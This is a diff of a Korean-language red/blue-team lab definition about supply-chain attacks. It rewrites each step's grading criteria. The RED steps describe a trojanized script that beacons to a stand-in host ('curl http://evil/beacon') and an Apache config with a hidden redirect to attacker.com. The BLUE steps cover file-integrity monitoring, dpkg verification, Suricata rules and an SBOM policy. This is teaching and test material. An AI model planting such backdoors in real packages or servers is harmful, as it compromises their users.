@@ -39,20 +39,23 @@ steps:
     type: output_contains
     expect: Trojanized package
     semantic:
-      intent: '[RED] 공급망 공격 시나리오 공격 단계 실습 — 실제 공격 명령/스크립트 실행 및 결과 확인'
+      intent: '[RED] 공급망 가짜 패키지 — /tmp/malicious_util.sh 로 정상 유틸 가장 (echo Hello World 정상 출력) + 백도어 코드
+        (curl http://evil/beacon & 무조건 실행) + chmod +x. 공급망 공격의 핵심: 정상 기능 + 숨겨진 악성 페이로드 트로이안 형태. MITRE
+        T1195.002 Compromise Software Supply Chain'
       success_criteria:
-      - 공격 명령/스크립트 실제 실행 또는 유효 페이로드 생성
-      - 목표 기법이 작동함을 출력·로그로 확인
-      - MITRE ATT&CK 기법 ID 또는 명칭 1개 이상 언급
+      - /tmp/malicious_util.sh 파일 생성
+      - 정상 기능 + 백도어 혼재 구조
+      - chmod +x 실행 권한
+      - T1195.002 매핑
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - cat > file + bash script 구조
+      - python setup.py 악성 postinstall
+      - npm package with malicious install script
+      - apt package postinst
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 단순 악성만 (정상 위장 없음)
+      - T1195 매핑 없음
+      - 실행 권한 없음
   target_vm: attacker
   script: 'cat > /tmp/supply_chain_package.sh << ''EOF'' #!/bin/bash # system-health-monitor v2.1.3 (TROJANIZED)
     # Normal functionality echo "System Health: OK" uptime # Hidden backdoor (would be obfuscated in real
@@ -79,20 +82,23 @@ steps:
     type: output_contains
     expect: COMPROMISED
     semantic:
-      intent: '[RED] 공급망 공격 시나리오 공격 단계 실습 — 실제 공격 명령/스크립트 실행 및 결과 확인'
+      intent: '[RED] 웹 설정 변조 시뮬 — /tmp/apache_modified.conf 에 정상 Apache VirtualHost + 악성 RewriteRule (정상
+        요청은 통과·특정 요청만 attacker.com 으로 302 리다이렉트). MITRE T1584.005 Compromise Infrastructure: Web Services.
+        정상 운영자는 surface check 로 놓침'
       success_criteria:
-      - 공격 명령/스크립트 실제 실행 또는 유효 페이로드 생성
-      - 목표 기법이 작동함을 출력·로그로 확인
-      - MITRE ATT&CK 기법 ID 또는 명칭 1개 이상 언급
+      - /tmp/apache_modified.conf 파일 생성
+      - 정상 설정 + 악성 RewriteRule 혼재
+      - 302 또는 redirect 악용
+      - T1584.005 매핑
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - cat > file + VirtualHost + RewriteRule
+      - nginx proxy_pass 악용
+      - .htaccess mod_rewrite
+      - Nginx Lua 스크립트 삽입
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 완전 악성 설정 (은닉성 없음)
+      - 정상 기능 유지 안 됨
+      - T1584 매핑 없음
   target_vm: attacker
   script: 'cat > /tmp/sc_apache_backdoor.conf << ''EOF'' # Apache configuration (COMPROMISED) <VirtualHost
     *:80> ServerName web.lab.local DocumentRoot /var/www/html # Normal config above... # Hidden C2 redirect
@@ -122,20 +128,22 @@ steps:
     type: output_contains
     expect: syscheck
     semantic:
-      intent: '[BLUE] 공급망 공격 시나리오 방어·탐지 단계 — 탐지 규칙·모니터링·대응 체계 구현'
+      intent: '[BLUE] FIM 설정 확장 — /etc/aide/aide.conf 편집 + aide --init + aide --check 로 웹 서버 설정(/etc/apache2/·/etc/nginx/)
+        + 시스템 바이너리(/usr/bin·/usr/sbin) + cron(/etc/cron.*) + 부팅(/boot) 모니터링. AIDE Advanced Intrusion Detection
+        Environment 통합 FIM. baseline.db 암호화 보호'
       success_criteria:
-      - Suricata/Wazuh/auditd/nftables 등 방어 도구 룰·설정 제시
-      - 탐지 시나리오 테스트 및 결과 로그
-      - false positive 또는 tuning 고려 언급
+      - AIDE 또는 Tripwire 설정
+      - 웹·시스템·cron 3 영역 모니터
+      - baseline 생성 (aide --init)
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - aide --init + --check
+      - Tripwire twinstall.sh
+      - Wazuh syscheck 모듈 통합
+      - osquery file_events
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - FIM 도구 없이 수동 해시
+      - baseline 없음
+      - 영역 1개만
   target_vm: siem
   script: cat > /tmp/fim_supply_chain.xml << 'EOF' <syscheck> <disabled>no</disabled> <frequency>300</frequency>
     <alert_new_files>yes</alert_new_files> <!-- Web server configs --> <directories check_all="yes" realtime="yes"
@@ -167,20 +175,22 @@ steps:
     type: output_contains
     expect: Package Integrity
     semantic:
-      intent: '[BLUE] 공급망 공격 시나리오 방어·탐지 단계 — 탐지 규칙·모니터링·대응 체계 구현'
+      intent: '[BLUE] 패키지 무결성 검증 스크립트 — dpkg --verify 전체 패키지 변조 탐지 (S5 체크섬 불일치 · M5 권한 불일치 · T5 타임스탬프
+        불일치) + sha256sum /bin/bash /bin/sh /usr/bin/python3 등 핵심 바이너리 해시 비교 with 알려진 정상 해시. apt download
+        --print-uris 로 원본 패키지 재검증'
       success_criteria:
-      - Suricata/Wazuh/auditd/nftables 등 방어 도구 룰·설정 제시
-      - 탐지 시나리오 테스트 및 결과 로그
-      - false positive 또는 tuning 고려 언급
+      - dpkg --verify 또는 rpm -V (RHEL)
+      - 핵심 바이너리 sha256 검증
+      - 알려진 정상 해시 비교
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - dpkg --verify + sha256sum
+      - rpm -Va (RHEL)
+      - debsums -s (Debian)
+      - AIDE 통합
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 패키지 검증 없이 파일만
+      - 해시 비교 기준 없음
+      - 변조 감지 개념 없음
   target_vm: web
   script: 'echo "=== Package Integrity Verification ===" && echo "[1] dpkg verify (modified packages):"
     && dpkg --verify 2>/dev/null | head -10 || echo "  dpkg verify not available" && echo "[2] Critical
@@ -209,20 +219,21 @@ steps:
     type: output_contains
     expect: SUPPLY-CHAIN
     semantic:
-      intent: '[BLUE] 공급망 공격 시나리오 방어·탐지 단계 — 탐지 규칙·모니터링·대응 체계 구현'
+      intent: '[BLUE] Suricata 공급망 네트워크 시그니처 — alert http (비표준 외부 연결 목적지 - apt/npm 공식 저장소 외부) + alert
+        http (비정상 업데이트 트래픽 - ubuntu update 시간 외 apt 연결) + alert dns (수상한 CDN 도메인 requestbin/ngrok 등).
+        공급망 compromise 의 네트워크 지표. /etc/suricata/rules/local.rules 에 추가'
       success_criteria:
-      - Suricata/Wazuh/auditd/nftables 등 방어 도구 룰·설정 제시
-      - 탐지 시나리오 테스트 및 결과 로그
-      - false positive 또는 tuning 고려 언급
+      - 비인가 외부 연결 룰
+      - 비정상 업데이트 트래픽 룰
+      - 공급망 특화 시그니처
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - alert http + 허용 목적지 whitelist
+      - alert dns + Spamhaus 블랙리스트
+      - ET Policy 룰셋 활용
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 일반 웹 공격 룰만
+      - 공급망 특화 아님
+      - 허용 목적지 개념 없음
   target_vm: secu
   script: 'cat > /tmp/supply_chain_detection.rules << ''EOF'' # Supply chain attack indicators alert http
     10.20.30.80 any -> !10.20.30.0/24 any (msg:"SUPPLY-CHAIN: Web server unexpected outbound HTTP"; flow:to_server,established;
@@ -259,20 +270,23 @@ steps:
     type: output_contains
     expect: SBOM
     semantic:
-      intent: '[BLUE] 공급망 공격 시나리오 방어·탐지 단계 — 탐지 규칙·모니터링·대응 체계 구현'
+      intent: '[BLUE] SBOM Software Bill of Materials 관리 정책 /tmp/sbom_policy.md — CycloneDX / SPDX 표준
+        준수 + 각 배포 패키지마다 SBOM 자동 생성 (Syft/cyclonedx-cli) + 취약점 조회 (Grype/Dependency-Track) + 신뢰 저장소 whitelist
+        + 공급사 보안 평가. SolarWinds/Log4j 이후 공급망 보안 필수 통제. US EO 14028 규제 준거'
       success_criteria:
-      - Suricata/Wazuh/auditd/nftables 등 방어 도구 룰·설정 제시
-      - 탐지 시나리오 테스트 및 결과 로그
-      - false positive 또는 tuning 고려 언급
+      - /tmp/sbom_policy.md 파일
+      - SBOM 표준 (CycloneDX 또는 SPDX)
+      - 생성·조회·검증 도구 체인
+      - 규제 준거 (EO 14028)
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - Syft/Grype/Dependency-Track 오픈소스
+      - Snyk/WhiteSource 상용
+      - CycloneDX Maven plugin
+      - GitHub Dependency Graph
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - SBOM 표준 없음
+      - 생성 도구 없이 개념만
+      - 규제 언급 없음
   target_vm: siem
   script: 'cat > /tmp/sbom_policy.txt << ''EOF'' === Software Bill of Materials (SBOM) Policy ===
 
@@ -308,20 +322,22 @@ steps:
     type: output_contains
     expect: supply_chain
     semantic:
-      intent: '[BLUE] 공급망 공격 시나리오 방어·탐지 단계 — 탐지 규칙·모니터링·대응 체계 구현'
+      intent: '[BLUE] Wazuh FIM + 패키지 룰 — local_rules.xml 에 (1) syscheck 이벤트에서 /etc/apache2·/etc/nginx·/etc/cron
+        변경 시 level 10 경보 + (2) apt/dpkg 로그 감시: /var/log/dpkg.log 에 install 이벤트 중 비공식 저장소 패키지. ossec.conf
+        <syscheck> 블록 설정 + directories real-time 모드'
       success_criteria:
-      - Suricata/Wazuh/auditd/nftables 등 방어 도구 룰·설정 제시
-      - 탐지 시나리오 테스트 및 결과 로그
-      - false positive 또는 tuning 고려 언급
+      - FIM syscheck 룰 + dpkg install 룰
+      - 비인가 패키지 탐지
+      - real-time 모드 활성
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - ossec.conf syscheck + local_rules.xml
+      - Wazuh agent real-time directories
+      - audit.rules + Wazuh 통합
+      - osquery + config_manager
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - FIM 또는 dpkg 한쪽만
+      - real-time 아닌 주기적만
+      - Wazuh 통합 없음
   target_vm: siem
   script: "cat > /tmp/wazuh_supply_chain.xml << 'EOF'\n<group name=\"supply_chain\">\n  <rule id=\"100800\"\
     \ level=\"12\">\n    <if_sid>550</if_sid>\n    <match>dpkg|apt-get|pip install</match>\n    <description>SUPPLY-CHAIN:\
@@ -363,20 +379,22 @@ steps:
     type: output_contains
     expect: Supply Chain Attack Assessment
     semantic:
-      intent: '[RED/BLUE] 공급망 공격 시나리오 통합 — Phase 전환 또는 종합 보고서·환경 정리'
+      intent: '[RED/BLUE] 공급망 공격 평가 보고서 /tmp/supply_chain_report.txt — 실습 시나리오 (가짜 패키지·웹 설정 변조) + 탐지 결과
+        (FIM·dpkg verify·Suricata) + 방어 매트릭스 (기술적 FIM/SBOM + 조달 보안 벤더 평가 + 운영 패치 관리) + 사례 분석 (SolarWinds
+        2020·XZ Backdoor 2024·Log4j). 환경 정리 (rm /tmp/malicious_util.sh /tmp/apache_modified.conf)'
       success_criteria:
-      - RED/BLUE 양쪽 산출물 모두 포함 또는 정리
-      - 보고서 파일 저장 또는 markdown 출력
-      - MITRE ATT&CK 매핑 + 개선 권고
+      - /tmp/supply_chain_report.txt 보고서
+      - 탐지 결과 + 방어 매트릭스
+      - 실제 사례 인용 (SolarWinds/XZ 등)
+      - 정리 수행
       acceptable_methods:
-      - 실제 도구(nmap/msfvenom/sqlmap/hydra/curl/ssh) 실행
-      - 방어 규칙 파일(.rules/XML) 작성 또는 편집
-      - Python 스크립트로 자동화 구현
-      - SSH 로 대상 VM 접속 후 명령 실행
+      - cat > file + 시나리오·탐지·방어 3요소
+      - NIST SP 800-161 SC-RM
+      - MITRE System of Trust
       negative_signs:
-      - 실행 없이 개념만 서술
-      - 결과 확인·로그 수집 누락
-      - RED/BLUE 역할 특성 무시한 일반 응답
+      - 사례 분석 없음
+      - 방어 매트릭스 부재
+      - 정리 누락
   target_vm: attacker
   script: 'rm -f /tmp/supply_chain_*.sh /tmp/sc_*.conf /tmp/sc_beacon.txt /tmp/fim_*.xml /tmp/sbom_*.txt
     2>/dev/null && cat > /tmp/supply_chain_report.txt << ''EOF'' === Supply Chain Attack Assessment Report
